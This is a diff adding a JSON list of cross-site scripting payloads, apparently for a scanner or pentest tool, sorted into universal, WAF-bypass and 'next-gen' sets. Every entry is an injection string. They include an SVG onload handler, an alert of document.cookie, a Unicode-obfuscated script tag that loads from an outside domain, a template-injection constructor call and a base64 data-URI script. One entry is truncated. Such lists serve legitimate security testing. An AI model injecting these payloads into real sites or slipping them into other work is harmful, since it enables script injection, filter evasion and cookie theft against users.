@@ -1,0 +1,14 @@
+{
+    "universal": [
+        "<svg/onload=alert`1`//",
+        "<javascript:alert(document.cookie)>"
+    ],
+    "waf_bypass": [
+        "<ſcript src=//Ǌ.₨/alert(1)>",
+        "<IMG SRC=&#0000106;...>"
+    ],
+    "next_gen": [
+        "{{constructor.constructor('alert(1)')()}}",
+        "<script src=data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==>"
+    ]
+}
